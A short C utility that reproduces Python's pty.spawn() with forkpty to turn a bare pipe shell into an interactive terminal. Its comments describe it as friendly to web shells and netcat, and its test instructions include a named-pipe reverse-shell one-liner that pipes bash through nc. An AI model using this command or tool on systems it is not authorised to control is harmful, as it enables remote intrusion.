/*
 * replicate the effect of python's `pty.spawn()` command
 *
 * to build:
 * cc     forkpty.c  -lutil -o forkpty
 *
 * to test:
 * (terminal 1) nc -nvlp 1234
 * (terminal 2) mkfifo foo; cat foo | bash -i | nc 127.0.0.1 1234 > foo
 * (terminal 1) ./pty /bin/bash
 *
 */

#include <pty.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h> 
#include <sys/time.h>
#include <sys/select.h>
#include <unistd.h>

void die(char *errmsg)
{
  perror(errmsg);
  exit(0);
}

void copy(int tofd, int fromfd)
{
  static char buf[8092];
  int nbytes = read(fromfd, buf, 8092);
  switch (nbytes)
  {
    case -1: //error
      die("read");
    case 0: // eof
      exit(0);
    default:
      write(tofd, buf, nbytes);
  }
}

int main(int argc, char **argv)
{
  // errors to stdout (webshell/nc friendly)
  // only use exit(0) for the same reason.
  dup2(STDOUT_FILENO, STDERR_FILENO);

  if (argc == 1) // no args provided
  {
    printf("usage: %s cmd [args...]\n", argv[0]);
    return 0;
  }

  // copy args for call to execvp
  char *args[argc];
  args[argc-1] = NULL;
  for (int i = 1; i < argc; i++)
    args[i-1] = argv[i];

  int terminalfd;

  // fork child process
  switch (forkpty(&terminalfd, NULL, NULL, NULL))
  {
    case -1: // error
      die("forkpty");

    case 0: // child
      execvp(args[0], args);
      die("execvp");

    default: // parent

      while (1)
      {
        fd_set fds;
        FD_ZERO(&fds);
        FD_SET(terminalfd, &fds);
        FD_SET(STDIN_FILENO, &fds);

        if (select(FD_SETSIZE, &fds, NULL, NULL, NULL) == -1)
          die("select");
        
        if (FD_ISSET(STDIN_FILENO, &fds))
          copy(terminalfd, STDIN_FILENO);
        if (FD_ISSET(terminalfd, &fds))
          copy(STDOUT_FILENO, terminalfd);
      }
  }
}
